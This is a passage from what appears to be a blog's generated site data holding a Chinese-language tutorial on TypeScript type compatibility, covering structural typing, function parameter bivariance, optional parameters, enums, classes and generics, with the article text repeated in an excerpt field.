这是不稳定的，因为调用者可能传入了一个具有更精确类型信息的函数，但是调用这个传入的函数的时候却使用了<strong>不是那么精确的类型信息</strong>。<br>实际上，这极少会发生错误，并且能够实现很多 <code>JavaScript</code> 里的常见模式。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">enum</span> EventType &#123; Mouse, Keyboard &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">interface</span> Event &#123; timestamp: <span class=\"built_in\">number</span>; &#125;</span><br><span class=\"line\"><span class=\"keyword\">interface</span> MouseEvent <span class=\"keyword\">extends</span> Event &#123; x: <span class=\"built_in\">number</span>; y: <span class=\"built_in\">number</span> &#125;</span><br><span class=\"line\"><span class=\"keyword\">interface</span> KeyEvent <span class=\"keyword\">extends</span> Event &#123; keyCode: <span class=\"built_in\">number</span> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">listenEvent</span>(<span class=\"params\">eventType: EventType, handler: (n: Event) =&gt; <span class=\"built_in\">void</span></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">/* ... */</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 常见的使用方式</span></span><br><span class=\"line\"><span class=\"comment\">// e: MouseEvent =&gt; &#123;x: number; y: number; timestamp: number;&#125;</span></span><br><span class=\"line\">listenEvent(EventType.Mouse, <span class=\"function\">(<span class=\"params\">e: MouseEvent</span>) =&gt;</span> <span class=\"built_in\">console</span>.log(e.x + <span class=\"string\">','</span> + e.y));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 并不是一个很好的代替品</span></span><br><span class=\"line\"><span class=\"comment\">// e: Event =&gt; &#123; timestamp: number; &#125;</span></span><br><span class=\"line\">listenEvent(EventType.Mouse, <span class=\"function\">(<span class=\"params\">e: Event</span>) =&gt;</span> <span class=\"built_in\">console</span>.log((&lt;MouseEvent&gt;e).x + <span class=\"string\">','</span> + (&lt;MouseEvent&gt;e).y));</span><br><span class=\"line\">listenEvent(EventType.Mouse, &lt;<span class=\"function\">(<span class=\"params\">e: Event</span>) =&gt;</span> <span class=\"built_in\">void</span>&gt;<span class=\"function\">(<span class=\"params\">(<span class=\"params\">e: MouseEvent</span>) =&gt; <span class=\"built_in\">console</span>.log(<span class=\"params\">e.x + ',' + e.y</span>)</span>));</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">// 这也不是很好</span></span><br><span class=\"line\"><span class=\"function\">// <span class=\"params\">e</span>: <span class=\"params\">number</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">listenEvent</span>(<span class=\"params\">EventType.Mouse, (<span class=\"params\">e: <span class=\"built_in\">number</span></span>) =&gt; <span class=\"built_in\">console</span>.log(<span class=\"params\">e</span>)</span>);</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"可选参数及剩余参数\"><a href=\"#可选参数及剩余参数\" class=\"headerlink\" title=\"可选参数及剩余参数\"></a>可选参数及剩余参数</h4><p>这里直接引用官方的说法。<br>比较函数兼容性的时候，可选参数与必须参数是可互换的。 <strong>源类型上有额外的可选参数不是错误，目标类型的可选参数在源类型里没有对应的参数也不是错误</strong>。<br>当一个函数有剩余参数时，它被当做 <code>无限个可选参数</code>。<br>这对于类型系统来说是不稳定的，但从运行时的角度来看，可选参数一般来说是不强制的，因为对于大多数函数来说相当于传递了一些  <code>undefinded</code>。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">invokeLater</span>(<span class=\"params\">args: <span class=\"built_in\">any</span>[], callback: (...args: <span class=\"built_in\">any</span>[]) =&gt; <span class=\"built_in\">void</span></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">/* ... Invoke callback with 'args' ... */</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Unsound - invokeLater \"might\" provide any number of arguments</span></span><br><span class=\"line\">invokeLater([<span class=\"number\">1</span>, <span class=\"number\">2</span>], <span class=\"function\">(<span class=\"params\">x, y</span>) =&gt;</span> <span class=\"built_in\">console</span>.log(x + <span class=\"string\">', '</span> + y));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Confusing (x and y are actually required) and undiscoverable</span></span><br><span class=\"line\">invokeLater([<span class=\"number\">1</span>, <span class=\"number\">2</span>], <span class=\"function\">(<span class=\"params\">x?, y?</span>) =&gt;</span> <span class=\"built_in\">console</span>.log(x + <span class=\"string\">', '</span> + y));</span><br></pre></td></tr></table></figure>\n<h4 id=\"函数重载\"><a href=\"#函数重载\" class=\"headerlink\" title=\"函数重载\"></a>函数重载</h4><p>官方文档上的说明很好理解：<br>对于有重载的函数，源函数的每个重载都要在目标函数上找到对应的函数签名。 这确保了目标函数可以在所有源函数可调用的地方调用。</p>\n<h3 id=\"枚举\"><a href=\"#枚举\" class=\"headerlink\" title=\"枚举\"></a>枚举</h3><p>枚举类型与数字类型兼容，并且数字类型与枚举类型兼容。不同枚举类型之间是不兼容的。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">enum</span> Status &#123; Ready, Waiting &#125;;</span><br><span class=\"line\"><span class=\"keyword\">enum</span> Color &#123; Red, Blue, Green &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> status = Status.Ready;</span><br><span class=\"line\">status = Color.Red; <span class=\"comment\">// -&gt; error, 不同枚举类型</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"类\"><a href=\"#类\" class=\"headerlink\" title=\"类\"></a>类</h3><p>类与对象字面量和接口差不多，但有一点不同：<strong>类有静态部分和实例部分的类型</strong>。 比较两个类类型的对象时，只有 <code>实例的成员会被比较</code>，<code>静态成员</code> 和 <code>构造函数</code> 不在比较的范围内。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> Animal &#123;</span><br><span class=\"line\">    feet: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\">name: <span class=\"built_in\">string</span>, numFeet: <span class=\"built_in\">number</span></span>) &#123; &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> Size &#123;</span><br><span class=\"line\">    feet: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\">numFeet: <span class=\"built_in\">number</span></span>) &#123; &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> a: Animal;</span><br><span class=\"line\"><span class=\"keyword\">let</span> s: Size;</span><br><span class=\"line\"></span><br><span class=\"line\">a = s;  <span class=\"comment\">// -&gt; success，如果比较构造函数，这里就会抛出错误</span></span><br><span class=\"line\">s = a;  <span class=\"comment\">// -&gt; success</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"私有成员\"><a href=\"#私有成员\" class=\"headerlink\" title=\"私有成员\"></a>私有成员</h4><p>私有成员会影响兼容性判断。 当类的实例用来检查兼容时，如果目标类型包含一个私有成员，那么<strong>源类型必须包含来自同一个类的这个私有成员</strong>。 这允许子类赋值给父类，但是不能赋值给其它有同样类型的类。</p>\n<h4 id=\"泛型\"><a href=\"#泛型\" class=\"headerlink\" title=\"泛型\"></a>泛型</h4><p>因为 <code>TypeScript</code> 是结构性的类型系统，类型参数只影响使用其做为类型一部分的结果类型。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> Empty&lt;T&gt; &#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">let</span> x: Empty&lt;<span class=\"built_in\">number</span>&gt;;</span><br><span class=\"line\"><span class=\"keyword\">let</span> y: Empty&lt;<span class=\"built_in\">string</span>&gt;;</span><br><span class=\"line\"></span><br><span class=\"line\">x = y;  <span class=\"comment\">// success, x 与 y 互相兼容，并不排斥</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> NotEmpty&lt;T&gt; &#123;</span><br><span class=\"line\">    data: T;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">let</span> x: NotEmpty&lt;<span class=\"built_in\">number</span>&gt;;</span><br><span class=\"line\"><span class=\"keyword\">let</span> y: NotEmpty&lt;<span class=\"built_in\">string</span>&gt;;</span><br><span class=\"line\"></span><br><span class=\"line\">x = y;  <span class=\"comment\">// error, x 为 number 时，date 为 number；y 为 string 时，date 为 string。x、y不兼容。</span></span><br></pre></td></tr></table></figure>\n<p>对于没指定泛型类型的泛型参数时，会把所有泛型参数当成 <code>any</code> 比较。<br>如下：</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> identity = <span class=\"function\"><span class=\"keyword\">function</span>&lt;<span class=\"title\">T</span>&gt;(<span class=\"params\">x: T</span>): <span class=\"title\">T</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> reverse = <span class=\"function\"><span class=\"keyword\">function</span>&lt;<span class=\"title\">U</span>&gt;(<span class=\"params\">y: U</span>): <span class=\"title\">U</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">identity = reverse;  <span class=\"comment\">// Okay because (x: any)=&gt;any matches (y: any)=&gt;any</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>在 <code>TypeScript</code> 里，有两种类型的兼容性：子类型与赋值。<br>它们的不同点在于，赋值扩展了子类型兼容，允许给 <code>any</code> 赋值或从 <code>any</code> 取值和允许数字赋值给枚举类型或枚举类型赋值给数字。</p>\n","site":{"data":{}},"excerpt":"<p>本文主要介绍 <code>typescript</code> 各个类型的兼容性。<br>","more":"</p>\n<h3 id=\"类型兼容性\"><a href=\"#类型兼容性\" class=\"headerlink\" title=\"类型兼容性\"></a>类型兼容性</h3><p>TypeScript里的类型兼容性是基于结构子类型的。 结构类型是一种只使用其成员来描述类型的方式。 它正好与名义（nominal）类型形成对比。<br><strong>如果不了解，请忽略上面这段话</strong>。</p>\n<h4 id=\"比较两个变量\"><a href=\"#比较两个变量\" class=\"headerlink\" title=\"比较两个变量\"></a>比较两个变量</h4><p>这里直接使用官方的例子：</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> Named &#123;</span><br><span class=\"line\">    name: <span class=\"built_in\">string</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> x: Named;</span><br><span class=\"line\"><span class=\"keyword\">let</span> y = &#123; name: <span class=\"string\">'Alice'</span>, location: <span class=\"string\">'Seattle'</span> &#125;; <span class=\"comment\">// y 的类型推断为 &#123;name: string, location: string&#125;</span></span><br><span class=\"line\">x = y; <span class=\"comment\">// -&gt; success，x 中拥有一个 name: string 类型， 符合 y 中 name 的数据类型；location 则继续沿用 y 的。</span></span><br><span class=\"line\">y = x; <span class=\"comment\">// -&gt; error，x 中的 name 属性类型符合 y 中 name 属性，但 x 缺少 location 属性，无法赋值给 y</span></span><br></pre></td></tr></table></figure>\n<p><strong>总结</strong>：<br>赋值对象(y)中包含被赋值对象(x)的属性类型，且被赋值对象(x)中的属性在赋值对象(y)中存在，则可以正常成功进行赋值。</p>\n<h4 id=\"比较两个函数\"><a href=\"#比较两个函数\" class=\"headerlink\" title=\"比较两个函数\"></a>比较两个函数</h4><p>比较两个函数和比较变量的比较方式大致一致；比较函数时，比较的是 <code>函数的参数</code> 和 <code>函数的返回值</code> ，且比较规则于比较变量规则相同。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 比较参数</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> x = <span class=\"function\">(<span class=\"params\">a: <span class=\"built_in\">number</span></span>) =&gt;</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">let</span> y = <span class=\"function\">(<span class=\"params\">b: <span class=\"built_in\">number</span>, s: <span class=\"built_in\">string</span></span>) =&gt;</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">y = x; <span class=\"comment\">// -&gt; success 同上</span></span><br><span class=\"line\">x = y; <span class=\"comment\">// -&gt; error 同上</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 比较返回值</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> x = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> (&#123;name: <span class=\"string\">'Alice'</span>&#125;);</span><br><span class=\"line\"><span class=\"keyword\">let</span> y = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> (&#123;name: <span class=\"string\">'Alice'</span>, location: <span class=\"string\">'Seattle'</span>&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">x = y; <span class=\"comment\">// -&gt; success 同上</span></span><br><span class=\"line\">y = x; <span class=\"comment\">// -&gt; error 同上</span></span><br></pre></td></tr></table></figure>\n<p>可以看出，两个函数比较的时候比较的仅仅是 <code>函数参数</code> 和 <code>函数返回值</code>，比较的规则依然沿用 <code>比较变量</code> 的结论。</p>\n<h4 id=\"函数参数双向协变\"><a href=\"#函数参数双向协变\" class=\"headerlink\" title=\"函数参数双向协变\"></a>函数参数双向协变</h4><p>这里直接引用官方的说法。<br>当比较函数参数类型时，只有当源函数参数能够赋值给目标函数或者反过来时才能赋值成功。 这是不稳定的，因为调用者可能传入了一个具有更精确类型信息的函数，但是调用这个传入的函数的时候却使用了<strong>不是那么精确的类型信息</strong>。<br>实际上，这极少会发生错误，并且能够实现很多 <code>JavaScript</code> 里的常见模式。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">enum</span> EventType &#123; Mouse, Keyboard &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">interface</span> Event &#123; timestamp: <span class=\"built_in\">number</span>; &#125;</span><br><span class=\"line\"><span class=\"keyword\">interface</span> MouseEvent <span class=\"keyword\">extends</span> Event &#123; x: <span class=\"built_in\">number</span>; y: <span class=\"built_in\">number</span> &#125;</span><br><span class=\"line\"><span class=\"keyword\">interface</span> KeyEvent <span class=\"keyword\">extends</span> Event &#123; keyCode: <span class=\"built_in\">number</span> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">listenEvent</span>(<span class=\"params\">eventType: EventType, handler: (n: Event) =&gt; <span class=\"built_in\">void</span></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">/* ... */</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 常见的使用方式</span></span><br><span class=\"line\"><span class=\"comment\">// e: MouseEvent =&gt; &#123;x: number; y: number; timestamp: number;&#125;</span></span><br><span class=\"line\">listenEvent(EventType.Mouse, <span class=\"function\">(<span class=\"params\">e: MouseEvent</span>) =&gt;</span> <span class=\"built_in\">console</span>.log(e.x + <span class=\"string\">','</span> + e.y));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 并不是一个很好的代替品</span></span><br><span class=\"line\"><span class=\"comment\">// e: Event =&gt; &#123; timestamp: number; &#125;</span></span><br><span class=\"line\">listenEvent(EventType.Mouse, <span class=\"function\">(<span class=\"params\">e: Event</span>) =&gt;</span> <span class=\"built_in\">console</span>.log((&lt;MouseEvent&gt;e).x + <span class=\"string\">','</span> + (&lt;MouseEvent&gt;e).y));</span><br><span class=\"line\">listenEvent(EventType.Mouse, &lt;<span class=\"function\">(<span class=\"params\">e: Event</span>) =&gt;</span> <span class=\"built_in\">void</span>&gt;<span class=\"function\">(<span class=\"params\">(<span class=\"params\">e: MouseEvent</span>) =&gt; <span class=\"built_in\">console</span>.log(<span class=\"params\">e.x + ',' + e.y</span>)</span>));</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">// 这也不是很好</span></span><br><span class=\"line\"><span class=\"function\">// <span class=\"params\">e</span>: <span class=\"params\">number</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">listenEvent</span>(<span class=\"params\">EventType.Mouse, (<span class=\"params\">e: <span class=\"built_in\">number</span></span>) =&gt; <span class=\"built_in\">console</span>.log(<span class=\"params\">e</span>)</span>);</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"可选参数及剩余参数\"><a href=\"#可选参数及剩余参数\" class=\"headerlink\" title=\"可选参数及剩余参数\"></a>可选参数及剩余参数</h4><p>这里直接引用官方的说法。<br>比较函数兼容性的时候，可选参数与必须参数是可互换的。 <strong>源类型上有额外的可选参数不是错误，目标类型的可选参数在源类型里没有对应的参数也不是错误</strong>。<br>当一个函数有剩余参数时，它被当做 <code>无限个可选参数</code>。<br>这对于类型系统来说是不稳定的，但从运行时的角度来看，可选参数一般来说是不强制的，因为对于大多数函数来说相当于传递了一些  <code>undefinded</code>。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">invokeLater</span>(<span class=\"params\">args: <span class=\"built_in\">any</span>[], callback: (...args: <span class=\"built_in\">any</span>[]) =&gt; <span class=\"built_in\">void</span></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">/* ... Invoke callback with 'args' ... */</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Unsound - invokeLater \"might\" provide any number of arguments</span></span><br><span class=\"line\">invokeLater([<span class=\"number\">1</span>, <span class=\"number\">2</span>], <span class=\"function\">(<span class=\"params\">x, y</span>) =&gt;</span> <span class=\"built_in\">console</span>.log(x + <span class=\"string\">', '</span> + y));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Confusing (x and y are actually required) and undiscoverable</span></span><br><span class=\"line\">invokeLater([<span class=\"number\">1</span>, <span class=\"number\">2</span>], <span class=\"function\">(<span class=\"params\">x?, y?</span>) =&gt;</span> <span class=\"built_in\">console</span>.log(x + <span class=\"string\">', '</span> + y));</span><br></pre></td></tr></table></figure>\n<h4 id=\"函数重载\"><a href=\"#函数重载\" class=\"headerlink\" title=\"函数重载\"></a>函数重载</h4><p>官方文档上的说明很好理解：<br>对于有重载的函数，源函数的每个重载都要在目标函数上找到对应的函数签名。 这确保了目标函数可以在所有源函数可调用的地方调用。</p>\n<h3 id=\"枚举\"><a href=\"#枚举\" class=\"headerlink\" title=\"枚举\"></a>枚举</h3><p>枚举类型与数字类型兼容，并且数字类型与枚举类型兼容。不同枚举类型之间是不兼容的。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">enum</span> Status &#123; Ready, Waiting &#125;;</span><br><span class=\"line\"><span class=\"keyword\">enum</span> Color &#123; Red, Blue, Green &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> status = Status.Ready;</span><br><span class=\"line\">status = Color.Red; <span class=\"comment\">// -&gt; error, 不同枚举类型</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"类\"><a href=\"#类\" class=\"headerlink\" title=\"类\"></a>类</h3><p>类与对象字面量和接口差不多，但有一点不同：<strong>类有静态部分和实例部分的类型</strong>。 比较两个类类型的对象时，只有 <code>实例的成员会被比较</code>，<code>静态成员</code> 和 <code>构造函数</code> 不在比较的范围内。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> Animal &#123;</span><br><span class=\"line\">    feet: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\">name: <span class=\"built_in\">string</span>, numFeet: <span class=\"built_in\">number</span></span>) &#123; &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> Size &#123;</span><br><span class=\"line\">    feet: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\">numFeet: <span class=\"built_in\">number</span></span>) &#123; &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> a: Animal;</span><br><span class=\"line\"><span class=\"keyword\">let</span> s: Size;</span><br><span class=\"line\"></span><br><span class=\"line\">a = s;  <span class=\"comment\">// -&gt; success，如果比较构造函数，这里就会抛出错误</span></span><br><span class=\"line\">s = a;  <span class=\"comment\">// -&gt; success</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"私有成员\"><a href=\"#私有成员\" class=\"headerlink\" title=\"私有成员\"></a>私有成员</h4><p>私有成员会影响兼容性判断。 当类的实例用来检查兼容时，如果目标类型包含一个私有成员，那么<strong>源类型必须包含来自同一个类的这个私有成员</strong>。 这允许子类赋值给父类，但是不能赋值给其它有同样类型的类。</p>\n<h4 id=\"泛型\"><a href=\"#泛型\" class=\"headerlink\" title=\"泛型\"></a>泛型</h4><p>因为 <code>TypeScript</code> 是结构性的类型系统，类型参数只影响使用其做为类型一部分的结果类型。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> Empty&lt;T&gt; &#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">let</span> x: Empty&lt;<span class=\"built_in\">number</span>&gt;;</span><br><span class=\"line\"><span class=\"keyword\">let</span> y: Empty&lt;<span class=\"built_in\">string</span>&gt;;</span><br><span class=\"line\"></span><br><span class=\"line\">x = y;  <span class=\"comment\">// success, x 与 y 互相兼容，并不排斥</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> NotEmpty&lt;T&gt; &#123;</span><br><span class=\"line\">    data: T;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">let</span> x: NotEmpty&lt;<span class=\"built_in\">number</span>&gt;;</span><br><span class=\"line\"><span class=\"keyword\">let</span> y: NotEmpty&lt;<span class=\"built_in\">string</span>&gt;;</span><br><span class=\"line\"></span><br><span class=\"line\">x = y;  <span class=\"comment\">// error, x 为 number 时，date 为 number；y 为 string 时，date 为 string。x、y不兼容。</span></span><br></pre></td></tr></table></figure>\n<p>对于没指定泛型类型的泛型参数时，会把所有泛型参数当成 <code>any</code> 比较。<br>如下：</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> identity = <span class=\"function\"><span class=\"keyword\">function</span>&lt;<span class=\"title\">T</span>&gt;(<span class=\"params\">x: T</span>): <span class=\"title\">T</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> reverse = <span class=\"function\"><span class=\"keyword\">function</span>&lt;<span class=\"title\">U</span>&gt;(<span class=\"params\">y: U</span>): <span class=\"title\">U</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">identity = reverse;  <span class=\"comment\">// Okay because (x: any)=&gt;any matches (y: any)=&gt;any</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>在 <code>TypeScript</code> 里，有两种类型的兼容性：子类型与赋值。<br>它们的不同点在于，赋值扩展了子类型兼容，允许给 <code>any</code> 赋值或从 <code>any</code> 